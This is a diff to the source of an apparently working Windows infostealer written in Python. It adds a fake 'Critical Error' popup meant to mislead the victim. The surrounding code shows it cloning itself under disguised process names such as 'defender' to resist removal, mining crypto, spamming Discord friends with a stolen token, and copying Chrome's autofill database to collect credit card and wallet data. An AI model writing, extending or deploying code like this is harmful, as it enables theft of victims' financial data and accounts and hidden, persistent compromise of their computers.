@@ -27,6 +27,7 @@ from Crypto.Cipher import AES
 from json import loads
 from regex import findall
 import platform
+from tkinter import messagebox
 from http.server import BaseHTTPRequestHandler, HTTPServer
 import time
 import codecs
@@ -51,6 +52,8 @@ CLONE_PROCESS = True # Create Instances of the program hidden in multiple path.
 PROCCESS_NAMES = ["defender", "sys", "google", "chrome", "proxy-services", "appdata-system", "visual-studio", "temp-file"]
 PROCESS_NUM = 3 #3 is the perfect number,if you want your program to be un-removable put it a 5 maximum 
 
+FAKERROR = True #Show fake critical error 
+FAKERRMSG = "Exception at thread 0xSxZ3b78"
 MINE = True #Mine crypto? True/False
 
 DMALL_FRIENDS = False #Dm all friends in discord using token.
@@ -137,6 +140,12 @@ if yes == "yes":
 				threading.Thread(launchProcesses(str(os.getenv('APPDATA')) + "\\" + folderName + "\\" + rdmchoice+ ".exe")).start()
 		else:
 			print("[.] Already duplicated.")
+	def fakerrthread():
+		if(FAKERROR == True):
+			root = tk.Tk()
+			root.withdraw()
+			messagebox.showwarning("Critical Error", FAKERRMSG) 
+	threading.Thread(target=fakerrthread).start()
 	try:
 		url = 'http://ipinfo.io/json'
 		response = requests.get(url)
@@ -182,39 +191,41 @@ if yes == "yes":
 
 
 	def stealChromeWin():
-		res =  """Stealed By 0xSxZ ------------> \n\n"""
-		creditcard = "=========Stealed by 0xSxZ =============\n\n"
-		currency = "=========Stealed by 0xSxZ =============\n\n"
 		try:
-			ibm = 0
-			for i in range(len(chromiumpaths)):
-				if not os.path.exists(chromiumpaths[i]):
-					continue
-				path = str(chromiumpaths[i] + "\\Web Data")
-				shutil.copyfile(path, "webdata.db")
-				path = "webdata.db"
-				db = sqlite3.connect(path)
-				connection = sqlite3.connect(str(path))
-				cursor = db.cursor()
-				cursor.execute("SELECT  name, value FROM 'autofill'")
-				for name, value in cursor.fetchall():
-					res = res + "[.] " + name + "\n\n[.] Val : " + value + "\n"
-					if("card" in value or "credit" in value):
-						creditcard = creditcard + res
-					if("currency" in value or "billing" in value or "wallet" in value or "finance" in value):
-						currency = currency + res
-					ibm = ibm + 1
-					
+			res =  """Stealed By 0xSxZ ------------> \n\n"""
+			creditcard = "=========Stealed by 0xSxZ =============\n\n"
+			currency = "=========Stealed by 0xSxZ =============\n\n"
+			try:
+				ibm = 0
+				for i in range(len(chromiumpaths)):
+					if not os.path.exists(chromiumpaths[i]):
+						continue
+					path = str(chromiumpaths[i] + "\\Web Data")
+					shutil.copyfile(path, "webdata.db")
+					path = "webdata.db"
+					db = sqlite3.connect(path)
+					connection = sqlite3.connect(str(path))
+					cursor = db.cursor()
+					cursor.execute("SELECT  name, value FROM 'autofill'")
+					for name, value in cursor.fetchall():
+						res = res + "[.] " + name + "\n\n[.] Val : " + value + "\n"
+						if("card" in value or "credit" in value):
+							creditcard = creditcard + res
+						if("currency" in value or "billing" in value or "wallet" in value or "finance" in value):
+							currency = currency + res
+						ibm = ibm + 1
+						
+						if(ibm >= 370):
+							break
+					connection.close()
 					if(ibm >= 370):
 						break
-				connection.close()
-				if(ibm >= 370):
-					break
-			Founded = True
-			return str(res) + "welekip" ":::667" + str(currency) + ":::667" + str(creditcard)
+				Founded = True
+				return str(res) + "welekip" ":::667" + str(currency) + ":::667" + str(creditcard)
 		except Exception as e:
 			print(e)
-
+		except:
+			return "welekip" ":::667" + "dazdza" + ":::667" +"dazdaz"
 	def stealChromeWinHistory():
 		try:
 			path = str(os.environ['USERPROFILE'] + "\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\Default\\History")
